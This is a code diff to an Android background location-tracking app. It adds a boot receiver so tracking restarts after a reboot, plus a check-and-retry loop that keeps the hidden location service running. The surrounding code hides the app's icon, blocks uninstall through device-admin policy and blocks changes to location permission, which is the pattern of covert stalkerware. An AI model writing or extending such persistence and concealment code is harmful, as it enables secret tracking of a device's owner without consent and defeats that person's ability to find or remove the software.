@@ -20,6 +20,7 @@ import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.WorkManager
 import com.plcoding.backgroundlocationtracking.admin.MyDeviceAdminReceiver
 import com.plcoding.backgroundlocationtracking.admin.PolicyManager
+import com.plcoding.backgroundlocationtracking.receiver.BootReceiver
 import com.plcoding.backgroundlocationtracking.service.LocationService
 import com.plcoding.backgroundlocationtracking.ui.theme.UserIdentityDialog
 import com.plcoding.backgroundlocationtracking.util.AppHider
@@ -61,7 +62,16 @@ class MainActivity : AppCompatActivity() {
 
         val sharedPref = getSharedPreferences("setup_prefs", Context.MODE_PRIVATE)
         if (sharedPref.getBoolean("setup_done", false)) {
-            Log.i(TAG, "🚫 Setup đã hoàn thành trước đó — đóng app ngay.")
+            Log.i(TAG, "🚫 Setup đã hoàn thành trước đó — kiểm tra service trước khi đóng app.")
+
+            // 🧩 Kiểm tra nếu service chưa chạy thì khởi động lại
+            if (!isLocationServiceRunning()) {
+                Log.w(TAG, "⚠️ LocationService chưa chạy — khởi động lại ngay.")
+                startLocationService()
+            } else {
+                Log.i(TAG, "📍 LocationService vẫn đang hoạt động — không cần setup lại")
+            }
+
             finishAndRemoveTask()
             return
         }
@@ -104,6 +114,9 @@ class MainActivity : AppCompatActivity() {
             policyManager.blockUninstall(true)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) policyManager.blockLocationPermissionChanges()
             policyManager.enforceLocationPolicy()
+
+            // 🧩 Bật BootReceiver để đảm bảo service tự khởi động sau reboot
+            enableBootReceiver()
 
             // 2️⃣ Sau khi apply policy xong → check quyền
             checkPermissions()
@@ -154,15 +167,30 @@ class MainActivity : AppCompatActivity() {
     }
 
     private suspend fun startTrackingSystem() {
-        if (!isLocationServiceRunning()) startLocationService() else Log.i(TAG, "📍 LocationService đã chạy")
+        var retryCount = 0
+        while (!isLocationServiceRunning() && retryCount < 3) {
+            Log.w(TAG, "⚠️ Service chưa khởi động, thử lại lần ${retryCount + 1}")
+            startLocationService()
+            delay(1000)
+            retryCount++
+        }
+
+        if (isLocationServiceRunning()) {
+            Log.i(TAG, "📍 LocationService đã khởi động thành công.")
+        } else {
+            Log.e(TAG, "❌ LocationService vẫn chưa khởi động được sau 3 lần thử.")
+        }
+
         scheduleRetryWorker()
         Log.i(TAG, "🚀 Tracking system khởi động hoàn chỉnh")
     }
 
     private fun startLocationService() {
         val serviceIntent = Intent(this, LocationService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ContextCompat.startForegroundService(this, serviceIntent)
-        else startService(serviceIntent)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+            ContextCompat.startForegroundService(this, serviceIntent)
+        else
+            startService(serviceIntent)
         Log.i(TAG, "📡 Đã khởi động LocationService (Foreground - ẩn hoàn toàn)")
     }
 
@@ -189,6 +217,16 @@ class MainActivity : AppCompatActivity() {
             .setNegativeButton("Thoát") { _, _ -> finish() }
             .setCancelable(false)
             .show()
+    }
+
+    private fun enableBootReceiver() {
+        val receiver = ComponentName(this, BootReceiver::class.java)
+        packageManager.setComponentEnabledSetting(
+            receiver,
+            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+            PackageManager.DONT_KILL_APP
+        )
+        Log.i(TAG, "🔔 BootReceiver đã được bật đảm bảo tự khởi động sau reboot")
     }
 
     override fun onDestroy() {
